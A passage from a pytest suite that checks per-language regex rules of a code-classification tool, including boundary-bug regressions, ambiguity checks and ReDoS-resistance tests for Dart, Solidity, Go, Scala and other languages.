    assert pattern.search("() sync* { yield 1; }")
    assert pattern.search("foo(a, b) => a + b;")


def test_dart_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents several pairs the automated ambiguity sweep flagged for
    sharing literal keywords: api<->dead_code/func_start
    ("class"/"mixin"/"enum"/"extension"/"typedef"), args<->comprehensions/
    dead_code/func_start ("if"/"for"/"while"/"switch"/"catch"),
    class_start<->func_start ("abstract"), class_start<->globals
    ("final"), comprehensions<->dead_code/func_start ("for"/"if"),
    dead_code<->func_start. All confirmed false positives: dead_code's
    `//`/`/*` comment-prefix requirement disambiguates it, args/
    comprehensions/func_start's built-in control-flow keyword exclusions
    (verified directly, not just via the negative lookahead's presence)
    prevent them from ever matching bare if/for/while/switch statements,
    and class_start requires an explicit class/mixin/enum keyword so it
    never collides with func_start's `abstract` modifier or globals'
    top-level `final` declarations on the same line.
    """
    api = DART_RULES["api"]
    dead_code = DART_RULES["dead_code"]
    func_start = DART_RULES["func_start"]
    args = DART_RULES["args"]
    comprehensions = DART_RULES["comprehensions"]
    class_start = DART_RULES["class_start"]
    globals_ = DART_RULES["globals"]

    live_class = "class Foo {"
    assert api.search(live_class) and not func_start.search(live_class) and not dead_code.search(live_class)

    commented_class = "// class Foo {"
    assert dead_code.search(commented_class)
    assert not api.search(commented_class) and not func_start.search(commented_class)

    for stmt in ("if (x > 0) {", "for (var i = 0; i < 10; i++) {", "while (x) {", "switch (x) {"):
        assert not args.search(stmt), f"args hallucinated on {stmt!r}"
        assert not func_start.search(stmt), f"func_start hallucinated on {stmt!r}"
    assert not comprehensions.search("if (x > 0) {")
    assert not comprehensions.search("for (var i = 0; i < 10; i++) {")

    assert dead_code.search("// if (x) {")
    assert not args.search("// if (x) {")

    assert class_start.search("abstract class Foo {")
    assert not func_start.search("abstract class Foo {")

    assert globals_.search("final x = 5;")
    assert not class_start.search("final x = 5;")

    comp_literal = "[for (var x in list) x * 2]"
    assert comprehensions.search(comp_literal)
    assert not dead_code.search(comp_literal) and not func_start.search(comp_literal)


def test_dart_test_vs_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (TypeScript's
    `myRegex.test('x')` colliding with its test-framework `.test(`):
    dart's `test` signature only matches the bareword `test`/`testWidgets`
    functions or `expect`/`verify`/`when` calls, never a `.test(` method
    call, so it doesn't collide with `regex_execution`'s `RegExp(...)`/
    `.hasMatch`/`.allMatches` forms.
    """
    test_pattern = DART_RULES["test"]
    regex_pattern = DART_RULES["regex_execution"]
    assert test_pattern.search("test('should work', () {});")
    assert regex_pattern.search("myRegex.hasMatch(input);")
    assert not test_pattern.search("myRegex.hasMatch(input);"), "test incorrectly matched a regex method call"


def test_dart_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity pattern from the issue template (C's cast syntax
    overlapping pointer-asterisk repetition): dart's explicit_casts
    (`as Type` / `(Type) value`) and pointers (dart:ffi `Pointer<`/
    `NativeFunction<`) don't share tokens and fire independently.
    """
    casts = DART_RULES["explicit_casts"]
    pointers = DART_RULES["pointers"]
    assert casts.search("x as String;")
    assert not casts.search("Pointer<Int32> p;"), "explicit_casts incorrectly matched an ffi pointer declaration"
    assert pointers.search("Pointer<Int32> p;")
    assert not pointers.search("x as String;"), "pointers incorrectly matched an explicit cast"


# ==============================================================================
# SOLIDITY: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #611)
# ==============================================================================
SOLIDITY_RULES = LANGUAGE_DEFINITIONS["solidity"]["rules"]

_SOLIDITY_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if (x) { return; }", None),
    ("args", "function transfer(address to, uint256 amount) public {", None),
    ("structural_boundaries", "pragma solidity ^0.8.20;", None),
    ("func_start", "function transfer(address to) public {", None),
    ("class_start", "contract Token {", None),
    ("safety", 'require(x > 0, "must be positive");', None),
    ("safety_bypasses", "unchecked { x++; }", None),
    ("high_risk_execution", "selfdestruct(payable(owner));", None),
    ("api", "function foo() external {", None),
    ("state_mutation", "balances[msg.sender] = amount;", None),
    ("dead_code", "// function foo() public {", "// just a note"),
    ("doc", "/// @notice does a thing", None),
    ("test", "assertEq(a, b);", None),
    ("globals", "msg.sender", None),
    ("generics", "mapping(address => uint256) public balances;", None),
    ("scientific", "keccak256(abi.encodePacked(x));", None),
    ("reflection_metaprogramming", "fallback() external payable {}", None),
    ("import", 'import "./Token.sol";', None),
    ("ownership", "// SPDX-License-Identifier: MIT", None),
    ("planned_debt", "// TODO: optimize gas", None),
    ("fragile_debt", "// HACK: workaround for reentrancy", None),
    ("spec_exposure", "// ERC-20 compliant", None),
    ("events", "emit Transfer(from, to, amount);", None),
    ("pointers", "uint256[] memory arr;", None),
    ("memory_alloc", "new uint256[](10);", None),
    ("inline_asm", "assembly { let x := 1 }", None),
    ("telemetry", 'console.log("debug");', None),
    ("explicit_casts", "uint256(x);", None),
    ("panics_and_aborts", 'revert("error");', None),
    ("bitwise_ops", "a & b;", None),
    ("sync_locks", "function foo() public nonReentrant {", None),
    ("immutability_locks", "uint256 public constant MAX = 100;", None),
    ("cleanup", "delete balances[msg.sender];", None),
    ("encapsulation", "uint256 private secret;", None),
    ("serialization_parsing", "abi.encode(a, b);", None),
    ("regex_execution", "keccak256(abi.encodePacked(a, b));", None),
    ("time_date_logic", "uint256 x = block.timestamp + 1 days;", None),
    ("ipc_rpc_bridges", "target.delegatecall(data);", None),
]


@pytest.mark.parametrize("signature,positive,negative", _SOLIDITY_SIMPLE_CASES)
def test_solidity_signature_positive_and_negative(signature, positive, negative):
    pattern = SOLIDITY_RULES[signature]
    assert pattern is not None, f"solidity's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"solidity {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"solidity {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_solidity_args_redos_immunity():
    pattern = SOLIDITY_RULES["args"]
    poison = "function foo(" + "a, " * 40000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_solidity_func_start_name_capture_and_redos_immunity():
    pattern = SOLIDITY_RULES["func_start"]
    m = pattern.search("function transfer(address to) public {")
    assert m is not None
    assert m.group(1) == "transfer"

    m2 = pattern.search("modifier onlyOwner() {")
    assert m2 is not None
    assert m2.group(1) == "onlyOwner"

    poison = "function" + " " * 60000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_solidity_class_start_captures_name_with_inheritance():
    pattern = SOLIDITY_RULES["class_start"]
    m = pattern.search("contract Token is ERC20 {")
    assert m is not None
    assert m.group(1) == "Token"

    m2 = pattern.search("abstract contract Base {")
    assert m2 is not None
    assert m2.group(1) == "Base"

    m3 = pattern.search("interface IERC20 {")
    assert m3 is not None
    assert m3.group(1) == "IERC20"

    poison = "contract" + " " * 60000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_solidity_import_dependency_capture():
    dep_pattern = SOLIDITY_RULES["_dependency_capture"]
    m = dep_pattern.search('import "./interfaces/IToken.sol";')
    assert m is not None
    assert "./interfaces/IToken.sol" in m.groups()

    m2 = dep_pattern.search('import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";')
    assert m2 is not None
    assert "@openzeppelin/contracts/token/ERC20/IERC20.sol" in m2.groups()


def test_solidity_ipc_rpc_bridges_boundary_regressions():
    """
    Regression test for 2 real bugs found inside the shared \\b(...)\\b
    wrapper:
    - `.call{value:` ends on `:` (non-word), so the trailing \\b only fired
      when a word char immediately followed -- the idiomatic spaced form
      `target.call{value: amount}(...)` never matched at all.
    - `emit\\s+[A-Z]` only ever consumed a single uppercase letter (no `+`/
      `*`), so for any real multi-character event name the char right
      after the matched letter was itself a word char -- word-to-word is
      not a \\b transition, so the trailing \\b failed for every event name
      longer than one letter (effectively all of them).
    """
    pattern = SOLIDITY_RULES["ipc_rpc_bridges"]
    assert pattern.search('(bool ok, ) = target.call{value: amount}("");'), (
        "the idiomatic spaced .call{value: ...} form still didn't match"
    )
    assert pattern.search('target.call{value:amount}("");')
    assert pattern.search("emit Transfer(from, to, amount);"), "a real multi-character event name still didn't match"
    assert pattern.search("target.delegatecall(data);")
    assert pattern.search("target.staticcall(data);")
    assert pattern.search("selfdestruct(payable(owner));")


def test_solidity_generics_nested_mapping_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the nested
    alternative's `[^)]+` was unbounded. Against an adversarial run of
    `mapping(mapping(uint => ` with no closing paren, this scaled
    ~4x per doubling of n (0.18s/0.72s/2.86s/11.4s at n=5k/10k/20k/40k)
    before being bounded to `{1,200}`.
    """
    pattern = SOLIDITY_RULES["generics"]
    poison = "mapping(" + "mapping(uint => " * 40000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)

    # Correctness must survive the bound: real nested mappings still match.
    assert pattern.search("mapping(address => mapping(address => uint256)) public allowances;")
    assert pattern.search("mapping(address => uint256) public balances;")


def test_solidity_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents 4 pairs the automated ambiguity sweep flagged for sharing
    literal keywords ("function"/"contract"): args<->dead_code,
    args<->func_start, class_start<->dead_code, dead_code<->func_start.
    dead_code's leading `//` comment-prefix requirement fully
    disambiguates it from func_start/class_start (which are line-anchored
    and never match a commented-out line), and args<->func_start both
    correctly firing on the same real `function foo(...) {` line is
    intentional overlap, not a false collision.
    """
    args = SOLIDITY_RULES["args"]
    dead_code = SOLIDITY_RULES["dead_code"]
    func_start = SOLIDITY_RULES["func_start"]
    class_start = SOLIDITY_RULES["class_start"]

    live_func = "function transfer(address to, uint256 amount) public {"
    assert args.search(live_func) and func_start.search(live_func), (
        "both args and func_start should legitimately match the same live function signature"
    )
    assert not dead_code.search(live_func), "dead_code incorrectly matched a live (non-commented) function"

    commented_func = "// function transfer(address to) public {"
    assert dead_code.search(commented_func)
    assert not func_start.search(commented_func), "func_start incorrectly matched a commented-out function"

    live_contract = "contract Token is ERC20 {"
    assert class_start.search(live_contract)
    assert not dead_code.search(live_contract)

    commented_contract = "// contract Token {"
    assert dead_code.search(commented_contract)
    assert not class_start.search(commented_contract), "class_start incorrectly matched a commented-out contract"


def test_solidity_explicit_casts_and_pointers_no_false_collision():
    """
    Known ambiguity check from the issue template: explicit_casts (value
    type casting) and pointers (memory/storage/calldata location
    keywords) don't share tokens and correctly co-fire independently on
    the same declaration when both are actually present.
    """
    casts = SOLIDITY_RULES["explicit_casts"]
    pointers = SOLIDITY_RULES["pointers"]
    assert casts.search("uint256(x);")
    assert not casts.search("uint256 memory x;"), "explicit_casts incorrectly matched a memory location keyword"
    assert pointers.search("uint256 memory arr;")
    assert not pointers.search("uint256(x);"), "pointers incorrectly matched an explicit cast"


# ==============================================================================
# CROSS-LANGUAGE SWEEP: `@`-PREFIXED LEADING-\b BOUNDARY BUGS
# ==============================================================================
# Found while investigating dart's `test_skip` (`@Ignore` never matched) and
# broadening the earlier find_symbolic_boundary_bugs.py-style sweep to also
# check the START of each \b(...)\b alternative, not just the end. `@` is a
# non-word character, so a shared LEADING \b before a `@`-prefixed
# alternative can only fire when a word character immediately precedes the
# `@` -- never true for how annotations/attributes/decorators are actually
# written (always preceded by whitespace or a line start). This silently
# blinded 10 already-"closed" or partially-fixed languages to nearly all of
# their annotation-based structural signatures. Each language's own
# dedicated closure PR already covers this signature; these are targeted
# regressions for the specific alternatives found broken, bundled together
# the same way the earlier ReDoS (#631) and symbolic-\b (#637) cross-language
# sweeps were.


def test_java_at_prefixed_annotations_leading_boundary_regression():
    r = LANGUAGE_DEFINITIONS["java"]["rules"]
    assert r["ui_framework"].search("@ModelAttribute\npublic String foo() {}")
    assert r["ssr_boundaries"].search("@ResponseBody\npublic String foo() {}")
    assert r["ssr_boundaries"].search("@ResponseStatus(HttpStatus.OK)")
    assert r["events"].search("@EventListener\npublic void onEvent() {}")
    assert r["events"].search('@KafkaListener(topics = "x")')
    assert r["dependency_injection"].search("@Autowired\nprivate Foo foo;")
    assert r["dependency_injection"].search("@Component\npublic class Foo {}")
    assert r["listeners"].search('@KafkaListener(topics = "x")')


def test_swift_at_prefixed_attributes_leading_boundary_regression():
    r = LANGUAGE_DEFINITIONS["swift"]["rules"]
    assert r["api"].search("@objc func foo() {}")
    assert r["api"].search("@IBOutlet weak var label: UILabel!")
    assert r["ui_framework"].search("@State private var count = 0")
    assert r["reflection_metaprogramming"].search("@objc dynamic func foo() {}")
    assert r["events"].search("@Published var value = 0")
    assert r["dependency_injection"].search("@Inject var service: FooService")


def test_css_at_rules_leading_boundary_regression():
    r = LANGUAGE_DEFINITIONS["css"]["rules"]
    assert r["branch"].search("@media (max-width: 600px) {")
    assert r["branch"].search("@container (min-width: 400px) {")
    assert r["structural_boundaries"].search("@keyframes spin {")
    assert r["structural_boundaries"].search("@font-face {")


def test_fortran_pfunit_annotations_leading_boundary_regression():
    r = LANGUAGE_DEFINITIONS["fortran"]["rules"]
    assert r["test"].search("@test")
    assert r["test"].search("@assertEqual(1, 1)")


def test_embedded_python_route_decorators_leading_boundary_regression():
    r = LANGUAGE_DEFINITIONS["embedded_python"]["rules"]
    assert r["ssr_boundaries"].search('@app.get("/")')
    assert r["ssr_boundaries"].search('@app.post("/")')


def test_zig_at_builtins_leading_boundary_regression():
    """
    Zig's cast/reflection/atomics/scientific operations are all `@builtin`
    forms -- this was the single most affected language, with 8 separate
    signatures silently blind to their primary detection surface.
    """
    r = LANGUAGE_DEFINITIONS["zig"]["rules"]
    assert r["safety_bypasses"].search("@ptrCast(x)")
    assert r["safety_bypasses"].search("const x: u8 = @truncate(y);")
    assert r["high_risk_execution"].search('@panic("oops");')
    assert r["concurrency"].search("@atomicLoad(u32, &x, .SeqCst);")
    assert r["scientific"].search("const v = @Vector(4, f32);")
    assert r["reflection_metaprogramming"].search("@typeInfo(T);")
    assert r["import"].search('@import("std");')
    assert r["explicit_casts"].search("@intCast(x);")
    assert r["panics_and_aborts"].search('@panic("err");')


def test_apex_suppresswarnings_leading_boundary_regression():
    r = LANGUAGE_DEFINITIONS["apex"]["rules"]
    assert r["safety_bypasses"].search("@SuppressWarnings('PMD')")
    assert r["test_skip"].search("@SuppressWarnings('PMD')")


def test_scala_at_prefixed_annotations_leading_boundary_regression():
    r = LANGUAGE_DEFINITIONS["scala"]["rules"]
    assert r["safety_bypasses"].search("case x: String @unchecked => x")
    assert r["dependency_injection"].search("@Inject val service: FooService")


def test_abap_odata_publish_leading_boundary_regression():
    r = LANGUAGE_DEFINITIONS["abap"]["rules"]
    assert r["api"].search("@OData.publish: true")


def test_groovy_at_prefixed_annotations_leading_boundary_regression():
    r = LANGUAGE_DEFINITIONS["groovy"]["rules"]
    assert r["ssr_boundaries"].search("@ResponseBody\ndef foo() {}")
    assert r["events"].search("@EventListener\ndef onEvent() {}")
    assert r["dependency_injection"].search("@Autowired\nFooService foo")
    assert r["immutability_locks"].search("@Immutable\nclass Point {}")


# ==============================================================================
# GO: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #583)
# ==============================================================================
GO_RULES = LANGUAGE_DEFINITIONS["go"]["rules"]

_GO_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if err != nil {", None),
    ("args", "func foo(x int) {", None),
    ("structural_boundaries", "package main", None),
    ("func_start", "func foo() {", None),
    ("class_start", "type Foo struct {", None),
    ("safety", "if err != nil {", None),
    ("safety_bypasses", "_, err = foo()", None),
    ("high_risk_execution", "os.Exit(1)", None),
    ("io", 'os.Open("file.txt")', None),
    ("api", "var Foo = 5", None),
    ("state_mutation", "x := 5", None),
    ("dead_code", "// func foo() {", "// just a note"),
    ("doc", "// Foo does something useful.", None),
    ("test", "func TestFoo(t *testing.T) {", None),
    ("concurrency", "go func() { }()", None),
    ("ui_framework", 'http.HandleFunc("/", handler)', None),
    ("closures", "func(x int) { return x }", None),
    ("globals", "var globalCount = 0", None),
    ("decorators", "//go:build linux", None),
    ("generics", "[T any]", None),
    ("comprehensions", "slices.Filter(s, f)", None),
    ("scientific", "math.Sqrt(4)", None),
    ("reflection_metaprogramming", "reflect.TypeOf(x)", None),
    ("import", 'import "fmt"', None),
    ("ownership", "// Author: Jane Doe", None),
    ("planned_debt", "// TODO: fix this", None),
    ("fragile_debt", "// HACK: workaround", None),
    ("spec_exposure", "// [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "var w http.ResponseWriter", None),
    ("events", "bus.Publish(event)", None),
    ("dependency_injection", "wire.Build(NewFoo)", None),
    ("macros", "//go:generate mockgen", None),
    ("pointers", "p := &x", None),
    ("memory_alloc", "make([]int, 10)", None),
    ("telemetry", 'slog.Info("message")', None),
    ("debug_prints", 'fmt.Println("debug")', None),
    ("explicit_casts", "int(x)", None),
    ("panics_and_aborts", 'panic("oops")', None),
    ("thread_sleeps", "time.Sleep(time.Second)", None),
    ("bitwise_ops", "x := a &^ b", None),
    ("sync_locks", "mu.Lock()", None),
    ("immutability_locks", "const Pi = 3.14", None),
    ("cleanup", "defer f.Close()", None),
    ("encapsulation", "var foo = 5", None),
    ("listeners", "func recv(ch <-chan int) {}", None),
    ("test_skip", 't.Skip("reason")', None),
    ("serialization_parsing", "json.Unmarshal(data, &v)", None),
    ("regex_execution", "regexp.MustCompile(pattern)", None),
    ("time_date_logic", "time.Now()", None),
    ("ipc_rpc_bridges", "grpc.Dial(addr)", None),
]


@pytest.mark.parametrize("signature,positive,negative", _GO_SIMPLE_CASES)
def test_go_signature_positive_and_negative(signature, positive, negative):
    pattern = GO_RULES[signature]
    assert pattern is not None, f"go's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"go {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"go {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_go_func_start_captures_name_and_skips_anonymous():
    pattern = GO_RULES["func_start"]
    m = pattern.search("func Foo() {")
    assert m is not None
    assert m.group(1) == "Foo"

    m2 = pattern.search("func (s *Server) Bar() {")
    assert m2 is not None
    assert m2.group(1) == "Bar"

    m3 = pattern.search("func\n(s *Server)\nBaz() {")
    assert m3 is not None
    assert m3.group(1) == "Baz", "vertical receiver shield failed to capture the name across newlines"

    assert not pattern.search("func(x int) { return x }"), "func_start incorrectly matched an anonymous function"


def test_go_class_start_captures_name_with_generics():
    pattern = GO_RULES["class_start"]
    m = pattern.search("type Foo struct {")
    assert m is not None
    assert m.group(1) == "Foo"

    m2 = pattern.search("type Stack[T any] struct {")
    assert m2 is not None
    assert m2.group(1) == "Stack"

    m3 = pattern.search("type Reader interface {")
    assert m3 is not None
    assert m3.group(1) == "Reader"


def test_go_import_dependency_capture():
    dep_pattern = GO_RULES["_dependency_capture"]
    m = dep_pattern.search('import "github.com/foo/bar"')
    assert m is not None
    assert "github.com/foo/bar" in m.groups()


def test_go_concurrency_select_boundary_regression():
    """
    Regression test: `select[ \\t]*\\{` ends on `{` (non-word), so the
    shared trailing \\b only fired when a word char immediately followed
    the brace -- never true in real Go, where a `select` block's body
    always starts on the next line. This core concurrency primitive
    never matched at all, spaced or not.
    """
    pattern = GO_RULES["concurrency"]
    assert pattern.search("select {\ncase <-ch:\n}"), "spaced select { still didn't match"
    assert pattern.search("select{\ncase <-ch:\n}"), "unspaced select{ still didn't match"
    assert pattern.search("ch := make(chan int)")


def test_go_generics_approximation_constraint_boundary_regression():
    """
    Regression test: `~[a-zA-Z_]\\w*` (the Go 1.18+ approximation-element
    constraint, e.g. `~int`) starts with `~` (non-word), so the shared
    leading \\b could only fire when a word char immediately preceded the
    `~` -- never true for how this constraint is actually written.
    """
    pattern = GO_RULES["generics"]
    assert pattern.search("[T ~int | ~string]"), "~int approximation constraint still didn't match"
    assert pattern.search("[T any]")
    assert pattern.search("[T comparable]")


def test_go_api_and_encapsulation_column_zero_and_keyword_regression():
    """
    Regression test for three layered bugs:
    1. `^[ \\t]*` allowed arbitrary leading whitespace, so both `api` and
       `encapsulation` matched ANY indented line starting with the
       matching case -- including a bare call to an exported function
       inside a function body, or (for encapsulation specifically) EVERY
       ordinary statement (`if`, `for`, `return`), since almost all Go
       keywords and local identifiers are lowercase.
    2. `encapsulation`'s optional `func` prefix let the engine skip
       matching "func" and instead fall through to matching the literal
       word "func" itself as a bare lowercase identifier -- misclassifying
       `func Foo() {}` (an exported, PUBLIC function) as private. Made the
       `func` prefix mandatory.
    3. Naively anchoring the no-prefix fallback to column 0 only (gofmt
       never indents *simple* top-level declarations) overcorrects: Go's
       grouped `var (...)`/`const (...)` blocks legitimately indent their
       member declarations (confirmed against real k8s source,
       `const (\\n\\tBurstReplicas = 500\\n)`), and those members ARE still
       top-level/exported identifiers. The fix keeps indentation tolerance
       for the no-prefix case but requires it, excludes Go's reserved
       keywords (encapsulation only -- keywords are always lowercase, so
       `api`'s uppercase-only match can never collide with one), and
       excludes anything immediately followed by `(` (a real function CALL
       statement, not a `Name = value`/`Name Type` group member) -- with a
       `\\b` before that final lookahead, since plain greedy `\\w+`
       backtracking can otherwise dodge the `(?!\\()` check by matching one
       character short of the true identifier end.
    """
    api = GO_RULES["api"]
    encap = GO_RULES["encapsulation"]

    assert not api.search("    DoSomething()"), "api hallucinated on an indented exported-function call"
    assert not encap.search("    DoSomething()")
    assert not encap.search("    if err != nil {"), "encapsulation hallucinated on a bare if statement"
    assert not encap.search("    return x"), "encapsulation hallucinated on a bare return statement"
    assert not encap.search("    foo()"), "encapsulation hallucinated on a bare private-looking call statement"

    assert api.search("func Foo() {") and not encap.search("func Foo() {"), (
        "func Foo() {} is a PUBLIC function -- api should match, encapsulation should not"
    )
    assert encap.search("func foo() {") and not api.search("func foo() {")
    assert api.search("var Foo = 5") and not encap.search("var Foo = 5")
    assert encap.search("var foo = 5") and not api.search("var foo = 5")
    assert api.search("const MaxRetries = 5") and not encap.search("const MaxRetries = 5")
    assert encap.search("const maxRetries = 5") and not api.search("const maxRetries = 5")
    assert api.search("type Foo struct {") and not encap.search("type Foo struct {")
    assert encap.search("type foo struct {") and not api.search("type foo struct {")

    # Grouped var/const block members: indented, but still top-level.
    assert api.search("\tBurstReplicas = 500"), "api failed on an indented grouped-const member"
    assert not encap.search("\tBurstReplicas = 500")
    assert encap.search("\tenableFoo = true"), "encapsulation failed on an indented grouped-var member"
    assert not api.search("\tenableFoo = true")
    assert api.search('\t\tGroup:    "apps",'), "api failed on an indented struct-literal field"


def test_go_closures_redos_immunity_and_bare_return_type():
    """
    Regression test for a confirmed real O(n^2) ReDoS: three unbounded
    `\\s*` occurrences plus two unbounded classes forced exhaustive
    backtracking (0.32s/1.27s/5.12s/20.6s at n=2k/4k/8k/16k, ~4x per
    doubling; 68.6s observed at n=30k) against an adversarial payload
    with two large whitespace runs that ultimately fails to complete a
    match. Bounding every quantifier and collapsing the two narrow
    optional groups into one bounded gap also fixed a real, separate
    correctness gap: a bare (non-parenthesized) single return type
    (`func(x int) int {`) never matched either of the old specific shapes.
    """
    pattern = GO_RULES["closures"]
    assert pattern.search("func(x int) int {"), "bare single return type still didn't match"
    assert pattern.search("func(a, b int) (int, error) {")
    assert pattern.search("func() { doSomething() }")

    poison = "func" + " \n" * 30000 + "(s *Server)" + " \n" * 30000 + "Foo("
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_go_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents 3 pairs the automated ambiguity sweep flagged for sharing
    literals ("const"/"type"/"var"): api<->dead_code, api<->encapsulation,
    dead_code<->encapsulation. All confirmed non-bugs: dead_code's
    comment-prefix requirement disambiguates it, and api/encapsulation
    correctly co-firing as mutually exclusive on the SAME declaration
    (one true, one false, based on identifier case) is the intended
    design, not a collision -- verified directly above in
    test_go_api_and_encapsulation_column_zero_and_keyword_regression.
    Also verified the flagged explicit_casts<->pointers overlap on
    `uintptr`: both legitimately fire on `uintptr(p)` (it's simultaneously
    an explicit cast expression and a pointer-arithmetic type), which is
    intentional dual-classification, not a false collision.
    """
    api = GO_RULES["api"]
    dead_code = GO_RULES["dead_code"]
    casts = GO_RULES["explicit_casts"]
    pointers = GO_RULES["pointers"]

    live_const = "const MaxRetries = 5"
    assert api.search(live_const)
    assert not dead_code.search(live_const)

    commented_const = "// const MaxRetries = 5"
    assert dead_code.search(commented_const)
    assert not api.search(commented_const)

    assert casts.search("uintptr(p)") and pointers.search("uintptr(p)")


def test_go_test_vs_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (TypeScript's
    `myRegex.test('x')` colliding with its test-framework `.test(`): go's
    `test` signature only matches `Test`/`Benchmark`/`Fuzz`-prefixed
    barewords, `t.Run`, or `assert`/`require`/`mock` calls -- never a
    bare `.test(`/`.MatchString(` method call, so it doesn't collide with
    `regex_execution`'s `regexp.MustCompile`/`.MatchString` forms.
    """
    test_pattern = GO_RULES["test"]
    regex_pattern = GO_RULES["regex_execution"]
    assert test_pattern.search("func TestFoo(t *testing.T) {")
    assert regex_pattern.search("myRegex.MatchString(s)")
    assert not test_pattern.search("myRegex.MatchString(s)"), "test incorrectly matched a regex method call"


# ==============================================================================
# CROSS-LANGUAGE SWEEP: LITERAL `()` TRAILING-\b BOUNDARY BUGS
# ==============================================================================
# Found while writing go's time_date_logic test (`time.Now()` never
# matched). Broadened the sweep to check every `\b(...)\b`-wrapped
# alternative ending in a literal empty-parens function call, since `)` is
# non-word and whatever follows a function call (`;`, a newline, another
# `.method()`, end of string) is never a word character -- the shared
# trailing \b can never fire. Affects 8 languages; bundled the same way as
# the earlier ReDoS (#631), symbolic-\b (#637), and @-boundary (#645) sweeps.


def test_python_globals_builtin_call_boundary_regression():
    r = LANGUAGE_DEFINITIONS["python"]["rules"]
    assert r["globals"].search("x = globals()")
    assert r["globals"].search("y = locals()")


def test_java_and_groovy_printstacktrace_boundary_regression():
    assert LANGUAGE_DEFINITIONS["java"]["rules"]["debug_prints"].search("e.printStackTrace();")
    assert LANGUAGE_DEFINITIONS["groovy"]["rules"]["debug_prints"].search("e.printStackTrace();")


def test_csharp_should_and_wait_boundary_regression():
    r = LANGUAGE_DEFINITIONS["csharp"]["rules"]
    assert r["test"].search("result.Should().Be(x);")
    assert r["thread_sleeps"].search("task.Wait();")
    assert not r["thread_sleeps"].search("myWait();"), "thread_sleeps incorrectly matched a substring identifier"


def test_swift_empty_parens_calls_boundary_regression():
    r = LANGUAGE_DEFINITIONS["swift"]["rules"]
    assert r["memory_alloc"].search("ptr.deallocate()")
    assert r["memory_alloc"].search("let p = UnsafeMutablePointer<Int>.allocate(capacity: 1)")
    assert r["time_date_logic"].search("let now = Date()")
    assert r["ipc_rpc_bridges"].search("let p = Process()")


def test_kotlin_regex_and_gson_boundary_regression():
    """
    Also fixes a distinct, deeper bug: `Regex\\(\\)` required LITERALLY
    empty parens, but Kotlin's `Regex` class has no zero-arg constructor
    -- real usage is always `Regex(pattern)`, which never matched even
    setting the boundary bug aside. Widened to `Regex\\(`.
    """
    r = LANGUAGE_DEFINITIONS["kotlin"]["rules"]
    assert r["serialization_parsing"].search("val gson = Gson()")
    assert r["regex_execution"].search('val r = Regex("[0-9]+")'), (
        "Regex(pattern) -- the only real constructor form -- still didn't match"
    )
    assert r["regex_execution"].search('val r = "abc".toRegex()')


def test_dart_router_boundary_regression():
    assert LANGUAGE_DEFINITIONS["dart"]["rules"]["ssr_boundaries"].search("final app = Router();")


# ==============================================================================
# SCALA: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #608)
# ==============================================================================
SCALA_RULES = LANGUAGE_DEFINITIONS["scala"]["rules"]

_SCALA_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if (x) then y else z", None),
    ("args", "def foo(x: Int, y: Int) = x + y", None),
    ("structural_boundaries", "import scala.util.Try", None),
    ("func_start", "def foo() = {}", None),
    ("class_start", "class Foo {", None),
    ("safety", "val x: Option[Int] = None", None),
    ("safety_bypasses", "x.asInstanceOf[String]", None),
    ("high_risk_execution", "System.exit(1)", None),
    ("io", "Source.fromFile(path)", None),
    ("api", "export Foo._", None),
    ("state_mutation", "var count = 0", None),
    ("dead_code", "// def foo() = {}", "// just a note"),
    ("doc", "/** A doc comment */", None),
    ("test", "assertEquals(1, 1)", None),
    ("concurrency", "Future { compute() }", None),
    ("ui_framework", 'dom.document.getElementById("x")', None),
    ("closures", "list.map(x => x * 2)", None),
    ("globals", 'sys.env("HOME")', None),
    ("decorators", "@deprecated", None),
    ("generics", "List[Int]", None),
    ("comprehensions", "for (x <- list) yield x * 2", None),
    ("scientific", "scala.math.sqrt(4)", None),
    ("reflection_metaprogramming", "implicit val x: Int = 5", None),
    ("import", "import scala.util.Try", None),
    ("ownership", "@author Jane Doe", None),
    ("planned_debt", "// TODO: refactor", None),
    ("fragile_debt", "// HACK: workaround", None),
    ("spec_exposure", "// [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "class MyController extends Controller {", None),
    ("events", "val source: Source[Int, _] = ???", None),
    ("dependency_injection", "lazy val foo = wire[FooService]", None),
    ("macros", "inline def foo() = 1", None),
    ("pointers", "val p: Ptr[Int] = ???", None),
    ("memory_alloc", "val z = Zone", None),
    ("telemetry", 'logger.info("message")', None),
    ("debug_prints", 'println("debug")', None),
    ("explicit_casts", "x.toInt", None),
    ("panics_and_aborts", 'throw new Exception("err")', None),
    ("thread_sleeps", "Thread.sleep(1000)", None),
    ("bitwise_ops", "a ^ b", None),
    ("sync_locks", "synchronized { }", None),
    ("immutability_locks", "val x = 5", None),
    ("cleanup", "conn.close()", None),
    ("encapsulation", "private val x = 5", None),
    ("listeners", 'emitter.on("event", cb)', None),
    ("test_skip", 'ignore("not ready") { }', None),
    ("serialization_parsing", "decode[Foo](json)", None),
    ("regex_execution", '"[0-9]+".r', None),
